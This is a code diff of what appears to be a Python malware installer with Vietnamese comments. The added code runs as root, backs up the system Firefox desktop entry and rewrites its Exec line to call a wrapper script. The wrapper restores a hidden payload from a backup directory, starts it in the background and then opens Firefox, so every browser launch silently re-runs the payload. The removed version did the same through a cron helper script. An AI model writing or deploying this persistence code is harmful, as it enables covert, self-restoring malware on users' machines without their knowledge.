@@ -1,22 +1,25 @@
-import subprocess
 import os
 import tempfile
-import hashlib
+import shutil
 from pathlib import Path
-import textwrap
-from config import (DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD, HELPER_SCRIPT_NAME,
-                    HELPER_DIR, DESKTOP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME, FIREFOX_BIN,
-                    DESKTOP_SCRIPT_NAME)
+from typing import Optional
+from config import (DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD, WRAPPER_DIR,
+                    WRAPPER_SCRIPT_NAME, DESKTOP_NAME_OVERRIDE, DESKTOP_DIR_OVERRIDE, FIREFOX_BIN)
+
+from handshake_and_move import check_root, remove_root_ownership
 
 
 def write_executable(path: Path, content: str, mode: int = 0o755):
     path.write_text(content)
     path.chmod(mode)
 
-def create_helper(progFileName: str, progFileBackup: str):
-    """
-    Creates a bash script to be used in cron job
-    """
+def read_content_in_firefox_desktop() -> str:
+    path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
+    if path.exists():
+        return path.read_text()
+    return ""
+
+def create_wrapper_script(progFileName: str, progFileBackup: str) -> Optional[Path]:
 
     dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
     backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)
@@ -25,115 +28,95 @@ def create_helper(progFileName: str, progFileBackup: str):
         os.makedirs(dirSaveVirus, exist_ok=True)
         os.makedirs(backupDir, exist_ok=True)
         dirSavePayload = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=dirSaveVirus)
+        # thu hồi tất cả quyền root các file/ dir mới tạo
+        remove_root_ownership(Path(dirSavePayload))
+        remove_root_ownership(Path(dirSaveVirus))
+        remove_root_ownership(Path(backupDir))
     except Exception as e:
         print(f"Error creating backup or virus directory: {e}")
         return None
 
 
-    helper_dir = os.path.expanduser(HELPER_DIR)
-    helper_path = Path(helper_dir) / HELPER_SCRIPT_NAME
-    os.makedirs(HELPER_DIR, exist_ok=True)
+    wrapper_dir = os.path.expanduser(WRAPPER_DIR)
+    wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME
 
     bash_content = f"""
-    #!/usr/bin/env bash
-    set -euo pipefail
-
-    export DISPLAY=:0
-    export XDG_RUNTIME_DIR=/run/user/1000
-    export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
-
+    ##!/bin/bash
+   
     PROG="{dirSavePayload}/{progFileName}"
     BACKUP="{backupDir}/{progFileBackup}"
 
-    LOCKFILE="/tmp/payload-cron-runner.lock"
-
-    # tránh chạy đồng thời
-    (
-      flock -n 9 || exit 0
-
-      if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
+    if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
         cp -a -- "$BACKUP" "$PROG"
         chmod +x -- "$PROG" || true
-      fi
+    fi
 
-      # Chạy chương trình nếu có thể
-      if [ -x "$PROG" ]; then
+    if [ -x "$PROG" ]; then
         cd "$HOME" || true
-        exec "$PROG"
-      fi
+        chown daicaduy:daicaduy "$PROG"
+        "$PROG" &
+        PROG_PID=$!
+        echo "✅ PROG started with PID: $PROG_PID"
+    fi
 
-    ) 9>"$LOCKFILE"
+    # 3. Chạy Firefox sau
+    exec "{FIREFOX_BIN}" "$@"
 
 """
-    write_executable(helper_path, bash_content)
-    return helper_path
-
-def create_wrapper(helper_path: Path):
-    wrapper_dir = os.path.expanduser(WRAPPER_DIR)
-    os.makedirs(wrapper_dir, exist_ok=True)
-    wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME
-    os.makedirs(WRAPPER_DIR, exist_ok=True)
-    content = textwrap.dedent(f"""\
-        #!/usr/bin/env bash
-        set -euo pipefail
-
-        HELPER="{str(helper_path)}"
-        BROWSER="{FIREFOX_BIN}"
-        FILE="$1"
-
-        if [ -x "$HELPER" ]; then
-            "$HELPER" "$FILE"
-        else-helper
-            echo "$(date --iso-8601=seconds) - helper missing or not executable: $HELPER" >> "$HOME/open-with.log"
-        fi
-
-        exec "$BROWSER" "$FILE"
-    """)
-    write_executable(wrapper_path, content)
+    write_executable(wrapper_path, bash_content)
+    remove_root_ownership(wrapper_path)
     return wrapper_path
 
-def create_desktop(wrapper_path: Path):
-    desktop_dir = os.path.expanduser(DESKTOP_DIR)
-    os.makedirs(desktop_dir, exist_ok=True)
-    desktop_path = Path(desktop_dir) / DESKTOP_SCRIPT_NAME
-    content = textwrap.dedent(f"""\
-        [Desktop Entry]
-        Name=Open with Helper (Firefox)
-        Exec={str(wrapper_path)} %f
-        Terminal=false
-        Type=Application
-        MimeType=text/html;
-        Categories=Network;WebBrowser;
-    """)
-    desktop_path.write_text(content)
-    desktop_path.chmod(0o644)
-    # update desktop database (user)
-    subprocess.run(["update-desktop-database", desktop_dir], check=False)
-    return desktop_path
+def backup_file(src: Path):
+    if src.exists():
+        bak = src.with_suffix(src.suffix + ".bak")
+        if not bak.exists():
+            shutil.copy2(src, bak)
+            print(f"Backed up {src} -> {bak}")
 
-def check_sum_content(content: str) -> str:
-    h = hashlib.md5()
-    h.update(content.encode('utf-8'))
-    return h.hexdigest()
+def create_desktop_override(wrapper_path: Path) -> Optional[Path]:
 
-def install_desktop_entry(progFileName: str, progFileBackup: str) -> bool:
-    helper_path = create_helper(progFileName, progFileBackup)
-    if not helper_path.exists():
-        print("Helper script was not created.")
+    # Đọc nội dung gốc của Firefox desktop entry
+    original_content = read_content_in_firefox_desktop()
+    if not original_content:
+        print(f"Error: Original Firefox desktop entry not found at {DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
+        return None
+
+    #tạo file backup nếu chưa có
+    if not Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}.bak").exists():
+        backup_file(Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}"))
+
+    # Tạo nội dung mới với Exec trỏ đến script wrapper
+    new_content = ""
+    for line in original_content.splitlines():
+        if line.startswith("Exec="):
+            new_content += f"Exec=bash -c 'cd \"$HOME\" && {wrapper_path} %u'\n"
+        else:
+            new_content += line + "\n"
+    new_content = new_content.strip() + "\n"
+    desktop_override_path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
+    write_executable(desktop_override_path, new_content, mode=0o755)
+
+    return desktop_override_path
+
+
+def install_desktop_entry(wrapper_path: Path) -> bool:
+
+    if not check_root():
+        print("Error: Must run as root to install desktop entry.")
         return False
 
-    wrapper_path = create_wrapper(helper_path)
-    if not wrapper_path.exists():
-        print("Error creating wrapper script.")
+    # backup existing desktop override if any
+    desktop_override_path = Path(f"{DESKTOP_DIR_OVERRIDE}/{DESKTOP_NAME_OVERRIDE}")
+    # kiểm tra nếu đã có bản sao lưu rồi thì không cần tạo nữa
+    if desktop_override_path.exists() and not desktop_override_path.with_suffix('.bak').exists():
+        backup_file(desktop_override_path)
+
+    desktop_override_path = create_desktop_override(wrapper_path)
+    if desktop_override_path is None:
+        print("Error creating desktop override.")
         return False
 
-    desktop_path = create_desktop(wrapper_path)
-    if not desktop_path.exists():
-        print("Error creating desktop entry.")
-        return False
-
-    print(f"✅ Created helper script: {helper_path}")
-    print(f"✅ Created wrapper script: {wrapper_path}")
-    print(f"✅ Created desktop entry: {desktop_path}")
-    print("You can now set 'Open with Helper (Firefox)' as the default application for HTML files.")
+    print(f"✅ Installed desktop override at {desktop_override_path}")
+    print(f"✅ Wrapper script created at {wrapper_path}")
     return True
